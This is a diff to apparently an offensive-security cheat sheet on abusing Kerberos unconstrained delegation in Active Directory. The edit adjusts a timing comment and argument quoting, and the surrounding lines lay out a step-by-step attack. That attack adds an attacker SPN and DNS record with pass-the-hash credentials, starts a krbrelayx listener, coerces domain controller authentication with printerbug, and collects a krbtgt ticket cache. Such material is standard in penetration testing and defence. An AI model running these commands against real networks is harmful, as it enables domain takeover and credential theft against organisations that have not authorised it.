@@ -48,7 +48,7 @@ addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOM
 # 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
 dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'
 
-# 3. Check that the record was added successfully (< 3 minutes)
+# 3. Check that the record was added successfully (after ~3 minutes)
 nslookup attacker.DOMAIN_FQDN DomainController
 
 # 4. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
@@ -59,7 +59,7 @@ krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE
 
 # 5. Authentication coercion
 # PrinterBug, PetitPotam, PrivExchange, ...
-printerbug.py domain/'vuln_account$'@DC_IP -hashes LM:NTLM DomainController
+printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'
 
 # 6. Check if it works
 # There should be a krbtgt ccache file in the current directory. And it can be used by
